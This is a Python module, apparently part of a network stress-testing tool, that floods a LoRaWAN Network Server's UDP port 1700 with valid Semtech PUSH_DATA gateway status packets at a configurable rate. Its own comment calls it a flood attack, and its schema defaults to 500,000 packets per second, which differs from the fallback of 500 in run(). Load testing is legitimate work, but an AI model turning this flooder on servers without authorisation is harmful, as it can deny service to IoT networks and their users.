"""
測項：LoRaWAN Gateway Bridge PUSH_DATA 洪水
分類：LoRaWAN Gateway Bridge（標準埠 1700/UDP，Semtech UDP Packet Forwarder 協定）
說明：LoRaWAN 閘道器（Gateway）與 Network Server 之間最普遍使用的傳輸協定是
     Semtech 制定、業界廣泛採用（ChirpStack、TTN 等 LoRaWAN Server 皆支援）的
     「UDP Packet Forwarder」協定，閘道器會用 PUSH_DATA 封包把收到的 LoRa
     訊框（或自身狀態統計 stat）上傳給 Server 的 1700/UDP。以受控速率重複送出
     合法格式的 PUSH_DATA，測試 Network Server 端對高頻閘道器上行流量的解析
     與處理能力，屬於 LPWAN IoT 閘道器情境常見的壓力測試面向。

封包內容：依 Semtech UDP Packet Forwarder 協定公開規範（semtech/udp_packet_forwarder
專案文件）組出，非自訂內容：
    Byte0:   protocol version = 0x02
    Byte1-2: random token（每則亂數，用於比對 PUSH_ACK）
    Byte3:   identifier = 0x00 (PUSH_DATA)
    Byte4-11: Gateway EUI（8 bytes）
    Byte12+: JSON payload（本測項送出最小合法的 stat 物件，模擬閘道器心跳/
             狀態回報，是最輕量、不含任何 LoRa 封包內容的合法上行訊息）

安全設計：一律送往 Orchestrator 傳入的單一 target:1700（不對公開 LoRaWAN
Server 發送）；不偽造來源位址；速率透過 RateLimiter 控制；duration 經
clamp_duration() 限制。

重要限制：本測項僅實作 PUSH_DATA 訊息型態（協定中還有 PULL_DATA/
PULL_RESP/TX_ACK 等其他型態，未實作），且 JSON payload 為最小可解析格式，
未在真實 LoRaWAN Network Server（ChirpStack/TTN Gateway Bridge 等）上驗證過
相容性，正式使用前建議先用 Wireshark 確認對方是否有回應 PUSH_ACK（identifier
0x01）。
需求：無額外套件，純標準函式庫。
"""
import json
import os
import random
import socket
import time

from ..common import RateLimiter, clamp_duration

NAME = "LoRaWAN Gateway Bridge PUSH_DATA 洪水"
CATEGORY = "LoRaWAN Gateway Bridge"
PROTOCOL = "UDP"
DEFAULT_PORT = 1700
TEST_TYPE = "traffic"  # PUSH_DATA 封包速率造成負擔的洪水攻擊

_PROTOCOL_VERSION = 0x02
_ID_PUSH_DATA = 0x00


def _build_push_data(token: bytes, gateway_eui: bytes) -> bytes:
    stat = {
        "stat": {
            "time": time.strftime("%Y-%m-%d %H:%M:%S GMT", time.gmtime()),
            "rxnb": 0,
            "rxok": 0,
            "rxfw": 0,
            "ackr": 100.0,
            "dwnb": 0,
            "txnb": 0,
        }
    }
    payload = json.dumps(stat, separators=(",", ":")).encode("utf-8")
    header = bytes([_PROTOCOL_VERSION]) + token + bytes([_ID_PUSH_DATA]) + gateway_eui
    return header + payload


def get_param_schema() -> dict:
    return {
        "rate_per_sec": {"type": "int", "default": 500000, "min": 1, "max": 500000, "desc": "每秒送出 PUSH_DATA 封包數"},
        "gateway_eui": {"type": "string", "default": "AA555A0000000000", "desc": "模擬的 Gateway EUI（16 個十六進位字元=8 bytes）"},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    duration = clamp_duration(duration)
    rate = int(params.get("rate_per_sec", 500))
    eui_hex = str(params.get("gateway_eui", "AA555A0000000000")).strip()
    try:
        gateway_eui = bytes.fromhex(eui_hex)[:8].ljust(8, b"\x00")
    except ValueError:
        gateway_eui = bytes.fromhex("AA555A0000000000")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(0.3)

    limiter = RateLimiter(rate)
    sent, recv, errors = 0, 0, 0
    start = time.time()

    log_fn(f"[+] LoRaWAN Gateway Bridge PUSH_DATA 洪水 -> {target}:{port} @ {rate}/s")
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        token = os.urandom(2)
        pkt = _build_push_data(token, gateway_eui)
        try:
            sock.sendto(pkt, (target, port))
            sent += 1
            try:
                sock.recv(1024)  # 預期 PUSH_ACK（identifier 0x01）
                recv += 1
            except socket.timeout:
                pass
        except OSError as e:
            errors += 1
            if errors <= 5:
                log_fn(f"[!] send error: {e}")

    sock.close()
    return {"packets_sent": sent, "acks_received": recv, "errors": errors, "elapsed_sec": round(time.time() - start, 1)}
